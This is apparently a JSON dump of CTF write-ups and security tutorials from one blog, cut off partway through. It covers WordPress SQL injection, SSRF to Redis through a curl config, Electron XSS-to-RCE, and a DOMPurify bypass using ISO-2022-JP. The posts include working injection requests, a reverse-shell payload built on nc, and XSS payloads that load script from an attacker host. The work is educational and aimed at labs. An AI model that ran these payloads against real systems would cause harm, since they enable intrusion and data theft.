[{"content":"AJAX Amsterdam These endpoints exist in the Plugin file 1 2 3 4 add_action(\u0026#39;wp_ajax_nopriv_aaf_load_data\u0026#39;, \u0026#39;aaf_remote_loader\u0026#39;); add_action(\u0026#39;wp_ajax_aaf_load_data\u0026#39;, \u0026#39;aaf_remote_loader\u0026#39;); add_action(\u0026#39;wp_ajax_nopriv_aaf_sys_maintenance\u0026#39;, \u0026#39;aaf_maintenance_mode\u0026#39;); add_action(\u0026#39;wp_ajax_aaf_sys_maintenance\u0026#39;, \u0026#39;aaf_maintenance_mode\u0026#39;); According to this writeup, these types of hooks can be accessed via /wp-admin/admin-ajax.php 1 wp_ajax_${action},wp_ajax_nopriv_${action} =\u0026gt; Access using /wp-admin/admin-ajax.php?action=${action} Let\u0026rsquo;s access the Ajax endpoint 1 GET /wp-admin/admin-ajax.php?action=aaf_load_data HTTP/1.1 Output:\n1 {\u0026#34;error\u0026#34;:\u0026#34;Access Denied. Fake fan detected.\u0026#34;} We can see that a simple WAF is present in ajax-amsterdam.php 1 2 3 4 5 if (!isset($_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]) || $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;] !== \u0026#39;F-Side\u0026#39;) { header(\u0026#34;HTTP/1.1 403 Forbidden\u0026#34;); echo json_encode(array(\u0026#34;error\u0026#34; =\u0026gt; \u0026#34;Access Denied. Fake fan detected.\u0026#34;)); wp_die(); } We can easily bypass it with User-Agent: F-Side 5. There is a SQL Injection Vulnerability in ajax-amsterdam.php\n1 2 3 4 5 $rid = $_GET[\u0026#39;rid\u0026#39;]; $query = \u0026#34;SELECT player_name, critique FROM $table_name WHERE id = \u0026#34; . $rid; // sql injection $data = $wpdb-\u0026gt;get_row($query); It is vulnerable to UNION injection attacks. The options API stores information in WP_OPTIONS table. I am unable to search by string comparison for some reason, so I just enumerate based on id 1 2 GET /wp-admin/admin-ajax.php?action=aaf_load_data\u0026amp;rid=-1+UNION+SELECT+option_name,option_value+FROM+wp_options+WHERE+option_id=161 HTTP/1.1 User-Agent: F-Side Output:\n1 {\u0026#34;player\u0026#34;:\u0026#34;aaf_admin_token\u0026#34;,\u0026#34;review\u0026#34;:\u0026#34;0368639a6cca2619fb8d5219b081768e\u0026#34;} From the Author: Alternative payloads\nfor 7. you can\u0026rsquo;t use strings in your injection because of wordpress magic quotes; code that gets executed by ajax hooks will use magic quotes, so quotes will be escaped\n1 union select option_name,option_value wp_options where option_name=0x6161665f61646d696e5f746f6b656e Then, we submit the token to the aaf_sys_maintenance endpoint 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 add_action(\u0026#39;wp_ajax_nopriv_aaf_sys_maintenance\u0026#39;, \u0026#39;aaf_maintenance_mode\u0026#39;); function aaf_maintenance_mode() { // SNIP $input_token = isset($_POST[\u0026#39;auth_token\u0026#39;]) ? $_POST[\u0026#39;auth_token\u0026#39;] : \u0026#39;\u0026#39;; $real_token = get_option(\u0026#39;aaf_admin_token\u0026#39;); if ($input_token === $real_token) { $response = array( \u0026#34;status\u0026#34; =\u0026gt; \u0026#34;success\u0026#34;, \u0026#34;action\u0026#34; =\u0026gt; \u0026#34;System Unlocked. F-Side controls the narrative.\u0026#34;, \u0026#34;flag\u0026#34; =\u0026gt; \u0026#34;RE:CTF{dontsubmitthisflagplease}\u0026#34; ); echo json_encode($response); } // SNIP } Output:\n1 {\u0026#34;status\u0026#34;:\u0026#34;success\u0026#34;,\u0026#34;action\u0026#34;:\u0026#34;System Unlocked. F-Side controls the narrative.\u0026#34;,\u0026#34;flag\u0026#34;:\u0026#34;RE:CTF{ezchainingunauthsqli2bac_oleeoleee}\u0026#34;} PHP-Redis In /config/apache2.conf, we see this configuration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;VirtualHost *:80\u0026gt; \u0026lt;SNIP\u0026gt; \u0026lt;Files \u0026#34;admin.php\u0026#34;\u0026gt; AuthType Basic AuthName \u0026#34;Admin Panel - Restricted Access\u0026#34; AuthUserFile \u0026#34;/etc/apache2/.htpasswd\u0026#34; Require valid-user \u0026lt;/Files\u0026gt; \u0026lt;FilesMatch \u0026#34;.+\\.php$\u0026#34;\u0026gt; SetHandler \u0026#34;proxy:fcgi://php-fpm:9000\u0026#34; SetEnvIf Request_URI \u0026#34;.*\u0026#34; SCRIPT_FILENAME=/var/www/html$0 \u0026lt;/FilesMatch\u0026gt; \u0026lt;SNIP\u0026gt; \u0026lt;/VirtualHost\u0026gt; It means apache2 server is matching for strictly \u0026lsquo;admin.php\u0026rsquo; I also noticed that an old version of Ubuntu is being used 1 FROM ubuntu:18.04 It is vulnerable to this ACL Bypass 1 GET /admin.php%3Fooo.php HTTP/1.1 It is does not match admin.php, but \u0026quot;proxy:fcgi://php-fpm:9000\u0026quot; will interpret it as /admin.php?ooo.php Output: 1 2 3 HTTP/1.1 200 OK \u0026lt;SNIP\u0026gt; TechCorp Network Monitor - Admin Dashboard There is a command injection vulnerability in admin.php 1 2 $command = \u0026#39;cd /tmp \u0026amp;\u0026amp; timeout 5 curl --max-time 3 \u0026#39; . implode(\u0026#39; \u0026#39;, $cmd_parts) . \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39;; exec($command, $result, $exit_code); // command Injection Maybe it is not possible due to the presence of escapeshellarg It accepts 4 parameters 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; isset($_POST[\u0026#39;action\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;action\u0026#39;] === \u0026#39;ping\u0026#39;) { header(\u0026#39;Content-Type: application/json\u0026#39;); $endpoint = $_POST[\u0026#39;url\u0026#39;] ?? \u0026#39;\u0026#39;; $param = $_POST[\u0026#39;opt\u0026#39;] ?? \u0026#39;\u0026#39;; $param_value = $_POST[\u0026#39;data\u0026#39;] ?? \u0026#39;\u0026#39;; $using_config = ($param === \u0026#39;-K\u0026#39; \u0026amp;\u0026amp; $param_value); // ... if ($param \u0026amp;\u0026amp; $param_value \u0026amp;\u0026amp; is_string($param) \u0026amp;\u0026amp; is_string($param_value)) { if (!preg_match(\u0026#39;/^-[A-Za-z]$/\u0026#39;, $param)) { echo json_encode([\u0026#39;success\u0026#39; =\u0026gt; false, \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;Invalid option\u0026#39;]); exit; } if ($param === \u0026#39;-K\u0026#39;) { // curl based on config file $cmd_parts[] = \u0026#39;-K\u0026#39;; $cmd_parts[] = escapeshellarg($param_value); } else if ($param === \u0026#39;-T\u0026#39;) { // upload files $cmd_parts[] = \u0026#39;-T\u0026#39;; $cmd_parts[] = escapeshellarg($param_value); } else if ($param === \u0026#39;-o\u0026#39; \u0026amp;\u0026amp; in_array($param_value, [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])) { // output files $unique_id = bin2hex(random_bytes(8)); $file_path = $param_value . \u0026#39;_\u0026#39; . $unique_id; $cmd_parts[] = \u0026#39;-o\u0026#39;; $cmd_parts[] = escapeshellarg($file_path); $saved_file = $file_path; } else if ($param === \u0026#39;-d\u0026#39; || in_array($param_value, [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;])) { // send POST data $cmd_parts[] = $param; $cmd_parts[] = escapeshellarg($param_value); } } Cool, the config file should enable us to bypass the WAF in front Let\u0026rsquo;s upload a file First, I created an endpoint that returns a file like this 1 url=gopher://127.0.0.1:6379/_CONFIG%20GET%20maxmemory To upload a file,\n1 2 POST /admin.php%3Fooo.php HTTP/1.1 url=https://webhook.site/4faf52c5-2b13-4f10-abf8-7ec4b2f6ebc1\u0026amp;opt=-o\u0026amp;data=GET\u0026amp;action=ping Output:\n1 {\u0026#34;success\u0026#34;:true,\u0026#34;message\u0026#34;:\u0026#34;Endpoint is reachable - Saved to: GET_2dbb0f46ffb56cea\u0026#34;,\u0026#34;output\u0026#34;:\u0026#34; % Total % Received % Xferd Average Speed Time Time Time Current\\n Dload Upload Total Spent Left Speed\\n\\r 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0\\r100 53 0 53 0 0 100 0 --:--:-- --:--:-- --:--:-- 100\u0026#34;,\u0026#34;filename\u0026#34;:\u0026#34;GET_2dbb0f46ffb56cea\u0026#34;} When I try to interact with the Redis server via Gopher, 1 2 POST /admin.php%3Fooo.php HTTP/1.1 url=%20\u0026amp;opt=-K\u0026amp;data=GET_2dbb0f46ffb56cea\u0026amp;action=ping I got this:\n1 {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Endpoint is unreachable\u0026#34;,\u0026#34;output\u0026#34;:\u0026#34;curl: (3) URL using bad\\/illegal format or missing URL\\ncurl: (1) Protocol \\\u0026#34;gopher\\\u0026#34; not supported or disabled in libcurl\u0026#34;} It is due to this config in Dockerfile\n1 2 3 4 5 6 7 8 9 10 \u0026amp;\u0026amp; cd curl-7.88.1 \\ \u0026amp;\u0026amp; ./configure \\ --prefix=/usr/local \\ --enable-optimize \\ --disable-manual \\ --disable-file \\ --disable-gopher \\ --with-openssl \\ --with-zlib \\ \u0026amp;\u0026amp; make -j$(nproc) \\ After reading a bit of documentation, I realised that it is possible to perform redis SSRF without the gopher protocol. 1 curl http://172.22.0.3:6379/ -X PING -H User-Agent: -H Host: -H Accept: -T redis-command --http0.9 Output:\n1 2 3 -ERR wrong number of arguments for \u0026#39;ping\u0026#39; command -ERR unknown command \u0026#39;Content-Length:\u0026#39;, with args beginning with: \u0026#39;5\u0026#39; +PONG I noticed that the current redis database does not contain the info we want. It was saved and the process is killed. 1 2 3 4 redis-server /usr/local/etc/redis/redis.conf \u0026amp; REDIS_PID=$! redis-cli SAVE kill $REDIS_PID And when I tried to run CONFIG, turns out it is already blacklisted.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 cat \u0026gt; /tmp/redis-protected.conf \u0026lt;\u0026lt; \u0026#39;EOF\u0026#39; protected-mode no bind 0.0.0.0 port 6379 rename-command DEL \u0026#34;\u0026#34; rename-command UNLINK \u0026#34;\u0026#34; rename-command FLUSHDB \u0026#34;\u0026#34; rename-command FLUSHALL \u0026#34;\u0026#34; rename-command SET \u0026#34;\u0026#34; rename-command SETEX \u0026#34;\u0026#34; rename-command SETNX \u0026#34;\u0026#34; rename-command SETRANGE \u0026#34;\u0026#34; rename-command MSET \u0026#34;\u0026#34; rename-command MSETNX \u0026#34;\u0026#34; rename-command GETSET \u0026#34;\u0026#34; rename-command APPEND \u0026#34;\u0026#34; rename-command RENAME \u0026#34;\u0026#34; rename-command RENAMENX \u0026#34;\u0026#34; rename-command MOVE \u0026#34;\u0026#34; rename-command EXPIRE \u0026#34;\u0026#34; rename-command EXPIREAT \u0026#34;\u0026#34; rename-command PEXPIRE \u0026#34;\u0026#34; rename-command PEXPIREAT \u0026#34;\u0026#34; rename-command RESTORE \u0026#34;\u0026#34; rename-command MIGRATE \u0026#34;\u0026#34; rename-command CONFIG \u0026#34;\u0026#34; rename-command SHUTDOWN \u0026#34;\u0026#34; EOF exec redis-server /tmp/redis-protected.conf But somehow, I am still able to retrieve the flag variable in the database. Gotta research more\n1 2 3 4 5 6 172.22.0.3:6379\u0026gt; keys * 1) \u0026#34;app_version\u0026#34; 2) \u0026#34;last_update\u0026#34; 3) \u0026#34;flag\u0026#34; 172.22.0.3:6379\u0026gt; GET flag \u0026#34;RE:CTF{fake_flag}\u0026#34; A simple POC to get flag from the redis server without gopher 1 2 3 4 5 6 7 8 9 10 11 12 echo \u0026#34;GET flag\u0026#34; \u0026gt; redis-command cat \u0026lt;\u0026lt; EOF \u0026gt; config url=http://172.22.0.3:6379/ -X PING -H User-Agent: -H Host: -H Accept: -T redis-command --http0.9 EOF # Im proud of the command on top :) 100% homemade curl -K config Output:\n1 2 3 4 -ERR wrong number of arguments for \u0026#39;ping\u0026#39; command -ERR unknown command \u0026#39;Content-Length:\u0026#39;, with args beginning with: \u0026#39;9\u0026#39; $17 RE:CTF{fake_flag} Cool Gameplan: New redis_command 1 GET flag First, upload redis_command file onto the server using the POST request above.\n1 redis_command=\u0026gt;GET_99012fe8c21cdb44 New config file\n1 2 3 4 5 6 -X PING -H User-Agent: -H Host: -H Accept: -T GET_99012fe8c21cdb44 --http0.9 Then, upload the config file\n1 config=\u0026gt;GET_ff980ff9116d9ec7 Then, we curl the Redis Server using the config file\n1 2 POST /admin.php%3Fooo.php HTTP/1.1 url=%20\u0026amp;opt=-K\u0026amp;data=GET_ff980ff9116d9ec7\u0026amp;action=ping Output:\n1 {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Endpoint is unreachable\u0026#34;,\u0026#34;output\u0026#34;:\u0026#34;curl: (3) URL using bad\\/illegal format or missing URL\u0026#34;} I realised that the redis server is not in the same machine as PHP_FPM. I also think that the new line is important. It seems like webhook is removing them. Let\u0026rsquo;s host our own server instead New redis_command 1 GET flag First, upload the redis_command file onto the server using the POST request below\n1 2 POST /admin.php%3Fooo.php HTTP/1.1 url=http://0.tcp.ap.ngrok.io:12286/redis-command\u0026amp;opt=-o\u0026amp;data=GET\u0026amp;action=ping Output:\n1 redis_command=\u0026gt;GET_e7326181518a0e04 New config file\n1 2 3 4 5 6 7 8 9 10 cat \u0026lt;\u0026lt; EOF \u0026gt; config url=http://redis:6379/ -X PING -H User-Agent: -H Host: -H Accept: -T GET_e7326181518a0e04 --http0.9 EOF Then, upload the config file\n1 2 POST /admin.php%3Fooo.php HTTP/1.1 url=http://0.tcp.ap.ngrok.io:12286/config\u0026amp;opt=-o\u0026amp;data=GET\u0026amp;action=ping Output:\n1 config=\u0026gt;GET_fa3dbc9bd61758ed Then, we curl the Redis Server using the config file\n1 2 POST /admin.php%3Fooo.php HTTP/1.1 url=http://redis:6379/\u0026amp;opt=-K\u0026amp;data=GET_fa3dbc9bd61758ed\u0026amp;action=ping Output:\n1 {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Endpoint is unreachable\u0026#34;,\u0026#34;output\u0026#34;:\u0026#34; % Total % Received % Xferd Average Speed Time Time Time Current\\n Dload Upload Total Spent Left Speed\\n\\r 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0\\r 95 207 0 198 0 0 197 0 --:--:-- 0:00:01 --:--:-- 197\\r100 263 0 254 100 9 126 4 0:00:02 0:00:02 --:--:-- 131\\r100 263 0 254 100 9 84 2 0:00:04 0:00:03 0:00:01 87\\ncurl: (28) Operation timed out after 3002 milliseconds with 254 bytes received\\n-ERR wrong number of arguments for \u0026#39;ping\u0026#39; command\\n-ERR unknown command \u0026#39;Content-Length:\u0026#39;, with args beginning with: \u0026#39;9\u0026#39;\\n-ERR unknown command \u0026#39;Expect:\u0026#39;, with args beginning with: \u0026#39;100-continue\u0026#39;\\n$49\\nRE:CTF{0r4ng3_1z_my_g04t_plu5_u_d0nt_n33d_g0ph3r}\\n % Total % Received % Xferd Average Speed Time Time Time Current\u0026#34;} Notes to self: dict and telnet protocol can be used too. ","date":"2026-01-17T20:03:21-05:00","permalink":"https://trinuro.github.io/p/reunionctf-2026-writeups/","title":"ReunionCTF 2026 Writeups"},{"content":" Electron is a technology that allows developers to use JavaScript to create desktop application. It achieves this by running a chromium instance for each window. Very wasteful imo This writeup is mostly content from the Electron Official Tutorial, but I added an intentionally vulnerable Electron app that allows XSS to turn into RCE as the last example. In Electron, \u0026ldquo;app\u0026rdquo; and \u0026ldquo;BrowserWindow\u0026rdquo; are two important concepts. BrowserWindow is an instance of Chromium that is running. Whenever we open a window, a new BrowserWindow is created. Users can directly call functions in the BrowserWindow. App is kind like engine that manages the \u0026ldquo;backend\u0026rdquo; stuff. Users are not able to directly call functions in the app. Simple Electron App Initialize NPM dependencies 1 2 npm init npm install electron --save-dev Add the following to scripts field 1 2 3 4 5 6 7 8 9 { // ... \u0026#34;main\u0026#34;: \u0026#34;main.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;electron .\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;hello world\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, // ... } index.html is the HTML code that will be rendered 1 2 3 4 5 6 7 8 9 10 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Hello from Electron renderer!\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Hello from Electron renderer!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;üëã\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; In the main.js file. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const { app, BrowserWindow } = require(\u0026#39;electron\u0026#39;) // this part defines the Window const createWindow = () =\u0026gt; { const win = new BrowserWindow({ width: 800, // specify the dimensions height: 600 }) win.loadFile(\u0026#39;index.html\u0026#39;) } app.whenReady().then(() =\u0026gt; { // listens for the \u0026#39;ready\u0026#39; event. Better than app.on(\u0026#39;ready\u0026#39;, () =\u0026gt; { apparently createWindow() }) ready event documentation To enable debugging, we can use this vscode config 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 { \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;compounds\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Main + renderer\u0026#34;, \u0026#34;configurations\u0026#34;: [\u0026#34;Main\u0026#34;, \u0026#34;Renderer\u0026#34;], \u0026#34;stopAll\u0026#34;: true } ], \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Renderer\u0026#34;, \u0026#34;port\u0026#34;: 9222, \u0026#34;request\u0026#34;: \u0026#34;attach\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;chrome\u0026#34;, \u0026#34;webRoot\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Main\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;node\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;cwd\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34;, \u0026#34;runtimeExecutable\u0026#34;: \u0026#34;${workspaceFolder}/node_modules/.bin/electron\u0026#34;, \u0026#34;windows\u0026#34;: { \u0026#34;runtimeExecutable\u0026#34;: \u0026#34;${workspaceFolder}/node_modules/.bin/electron.cmd\u0026#34; }, \u0026#34;args\u0026#34;: [\u0026#34;.\u0026#34;, \u0026#34;--remote-debugging-port=9222\u0026#34;], \u0026#34;outputCapture\u0026#34;: \u0026#34;std\u0026#34;, \u0026#34;console\u0026#34;: \u0026#34;integratedTerminal\u0026#34; } ] } To start the application, 1 npm run start Output: Exposing Inter-Process Functions to Client Side preload.js allows us to expose certain functions into client-side processes. A BrowserWindow\u0026rsquo;s preload script runs in a context that has access to both the HTML DOM and a limited subset of Node.js and Electron APIs. To add features to your renderer that require privileged access, you can define¬†global¬†objects through the¬†contextBridge¬†API. Use contextBridge in preload.js 1 2 3 4 5 const { contextBridge } = require(\u0026#39;electron\u0026#39;) contextBridge.exposeInMainWorld(\u0026#39;exec\u0026#39;, { ping: () =\u0026gt; \u0026#34;pong\u0026#34; }) To tell browserWindow to preload a user-defined script, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const { app, BrowserWindow } = require(\u0026#39;electron\u0026#39;) const path = require(\u0026#39;node:path\u0026#39;) const createWindow = () =\u0026gt; { const win = new BrowserWindow({ width: 800, height: 600, webPreferences: { preload: path.join(__dirname, \u0026#39;preload.js\u0026#39;) // define preload field in webPreferences } }) win.loadFile(\u0026#39;index.html\u0026#39;) } app.whenReady().then(() =\u0026gt; { createWindow() }) Write HTML code that invokes the JavaScript function id 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p id=\u0026#34;a\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script\u0026gt; const information = document.getElementById(\u0026#39;a\u0026#39;) async function getPing(){ information.innerText = await window.exec.ping() } getPing() \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Exposing Functions that Calls Other Libraries to Client Side First, we need to establish a 2-way communication between the browser window and app in preload.js with ipcRenderer 1 2 3 4 5 const { contextBridge, ipcRenderer } = require(\u0026#39;electron/renderer\u0026#39;) contextBridge.exposeInMainWorld(\u0026#39;electronAPI\u0026#39;, { pwn: (cmd) =\u0026gt; ipcRenderer.invoke(\u0026#39;command:exec\u0026#39;, cmd) }) This means that we can access window.electronAPI.pwn in the client-side JavaScript window.electronAPI.pwn will throw command:exec event to main.js ipcRenderer.invoke('command:exec', cmd) means that we can call this event via window.electronAPI.pwn(cmd) We must register a listener for command:exec in main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 const { app, BrowserWindow, ipcMain} = require(\u0026#39;electron/main\u0026#39;) const path = require(\u0026#39;node:path\u0026#39;) const {execSync} = require(\u0026#39;node:child_process\u0026#39;) async function execCommand (event, args) { // this function will be executed console.log(args) return execSync(args).toString() } function createWindow () { const mainWindow = new BrowserWindow({ webPreferences: { preload: path.join(__dirname, \u0026#39;preload.js\u0026#39;) } }) mainWindow.loadFile(\u0026#39;index.html\u0026#39;) } app.whenReady().then(() =\u0026gt; { ipcMain.handle(\u0026#39;command:exec\u0026#39;, execCommand) // register a listener for command:exec in app from the browserWindow // execCommand will be executed createWindow() app.on(\u0026#39;activate\u0026#39;, function () { if (BrowserWindow.getAllWindows().length === 0) createWindow() }) }) app.on(\u0026#39;window-all-closed\u0026#39;, function () { if (process.platform !== \u0026#39;darwin\u0026#39;) app.quit() }) ipcMain.handle('command:exec', execCommand) registers the event and specifies which function will handle the event The function will always accept at least one parameter. The first is event, which passes info about the event. The second parameter onwards are the parameters sent by the client. To achieve remote code execution, open Developer console and enter 1 window.electronAPI.pwn(\u0026#34;id\u0026#34;) XSS -\u0026gt; RCE in Electron First, we identify that there is a command injection vulnerability in the code in execCommand 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // main.js const {app, BrowserWindow, ipcMain} = require(\u0026#34;electron\u0026#34;); const path = require(\u0026#34;node:path\u0026#34;); const {execSync} = require(\u0026#34;node:child_process\u0026#34;); const initWindow = () =\u0026gt;{ const win = new BrowserWindow({ webPreferences: { preload: path.join(__dirname, \u0026#39;preload.js\u0026#39;) } }); win.loadFile(\u0026#34;index.html\u0026#34;); } const execCommand = (event, cmd) =\u0026gt;{ console.log(cmd); return execSync(cmd).toString(); // We can execute arbitrary code here } app.whenReady().then(()=\u0026gt;{ ipcMain.handle(\u0026#39;command:exec\u0026#39;, execCommand); initWindow(); }) Notice ipcMain.handle('command:exec', execCommand);. This means that when the client-side throws a command:exec event, it will be handled by execCommand function Let\u0026rsquo;s check the preload.js which is injected into each new client process 1 2 3 4 5 6 // preload.js const {contextBridge, ipcRenderer} = require(\u0026#39;electron\u0026#39;) contextBridge.exposeInMainWorld(\u0026#39;pwn\u0026#39;,{ exec: (cmd) =\u0026gt; ipcRenderer.invoke(\u0026#39;command:exec\u0026#39;, cmd) }) This means that there exists a API in the client side called window.pwn.exec exec: (cmd) =\u0026gt; means that this command accepts 1 parameter ipcRenderer.invoke('command:exec', cmd) means that this command throws command:exec event So, we can trigger the command injection vulnerability with window.pwn.exec(cmd) First, we confirm that we can achieve XSS It is due a sink here 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form id=\u0026#34;myform\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;input\u0026#34; type=\u0026#34;text\u0026#34;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div id=\u0026#34;output\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; const inputElement = document.getElementById(\u0026#34;input\u0026#34;); const outputElement = document.getElementById(\u0026#34;output\u0026#34;); const form = document.getElementById(\u0026#34;myform\u0026#34;); function handleFormSubmit(event) { event.preventDefault(); outputElement.innerHTML = inputElement.value; // sink } form.addEventListener(\u0026#34;submit\u0026#34;, handleFormSubmit); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We can get a reverse shell via XSS Payload 1 \u0026lt;img src=x onerror=\u0026#34;window.pwn.exec(\u0026#39;nc 127.0.0.1 7777 -c sh\u0026#39;)\u0026#34;\u0026gt; Output:\n1 2 3 4 5 nc -lvnp 7777 listening on [any] 7777 ... connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 36742 whoami kali References This blog post is inspired by Reunion CTF 2026 - ClientSide. I wanted to solve the challenge but couldn\u0026rsquo;t get it to work locally. Special thanks to the creator for this interesting challenge and solutions. Main references: https://www.electronjs.org/docs/latest/api/app https://www.electronjs.org/docs/latest/tutorial/tutorial-prerequisites ","date":"2026-01-17T19:47:54-05:00","permalink":"https://trinuro.github.io/p/electron-xss-to-rce/","title":"Electron XSS to RCE"},{"content":" Firefox will interpret a HTTP response as having ISO-2022-JP encoding if it contains the bytes %1b%28%4a To confirm that Firefox interprets the page as ISO-2022-JP encoding, send a request like the one below. 1 2 3 4 POST /save HTTP/1.1 Host: 127.0.0.1:3000 content=%1b%28%4a%5c %1b%28%4a: The bytes after this are JIS X 0201-1976 encoded %5c: Normally, it is \\, but it is the Yen symbol in JIS X 0201-1976 code. Output (Firefox): We can also press Control+I to open page info and view the text encoding. This is an example of Dompurify bypass using ISO-2022-JP encoding 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const createDOMPurify = require(\u0026#34;dompurify\u0026#34;); const { JSDOM } = require(\u0026#34;jsdom\u0026#34;); const http = require(\u0026#34;http\u0026#34;); const server = http.createServer((req, res) =\u0026gt; { const window = new JSDOM(\u0026#34;\u0026#34;).window; const DOMPurify = createDOMPurify(window); const clean = DOMPurify.sanitize(`\u0026lt;a id=\u0026#34;\\x1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;\\x1b(B\u0026lt;a id=\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;`); res.statusCode = 200; res.setHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;text/html\u0026#34;); res.end(clean); }); const PORT = process.env.PORT || 4000; server.listen(PORT, () =\u0026gt; { console.log(`Server is running on port ${PORT}`); }); It is really clever. \u0026lt;a id=\u0026quot;\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt;\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; by itself does not trigger an XSS. However, by converting B\u0026quot;\u0026gt;\u0026lt;/a\u0026gt;\\x1 into the Japanese encoding, we can remove \u0026quot; from the first \u0026lt;a\u0026gt; To get the victim\u0026rsquo;s browser to connect to the attacker server, 1 2 3 4 POST /save HTTP/1.1 Host: 127.0.0.1:3000 content=\u0026lt;a+id%3d\u0026#34;%1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;%1b(B\u0026lt;a+id%3d\u0026#34;\u0026gt;\u0026lt;img+src%3dx+onerror%3dfetch(\u0026#39;http%3a//172.21.0.1%3a9999\u0026#39;)\u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 nc -lvnp 9999 listening on [any] 9999 ... connect to [172.21.0.1] from (UNKNOWN) [192.168.248.138] 38586 GET / HTTP/1.1 Host: 172.21.0.1:9999 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://127.0.0.1:3000/ Origin: http://127.0.0.1:3000 Connection: keep-alive Priority: u=4 Cool! We can make the server load any JavaScript file we want. 1 2 3 4 POST /save HTTP/1.1 Host: 127.0.0.1:3000 content=\u0026lt;a+id%3d\u0026#34;%1b$B\u0026#34;\u0026gt;\u0026lt;/a\u0026gt;%1b(B\u0026lt;a+id%3d\u0026#34;\u0026gt;\u0026lt;script+src=http://172.21.0.1:9999/poc.js\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; Let poc.js be\n1 print() Output: 6. The flag is stored in the FTP server as flag.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 export const setFlag = async () =\u0026gt; { const client = new Client(); client.ftp.verbose = true; try { await client.access({ host: \u0026#34;db\u0026#34;, user: \u0026#34;ftp\u0026#34;, password: process.env.FTP_PASSWORD, port: 2121 }); const flagStream = Readable.from([process.env.FLAG || \u0026#34;RE:CTF{fakeflag}\u0026#34;]); await client.uploadFrom(flagStream, 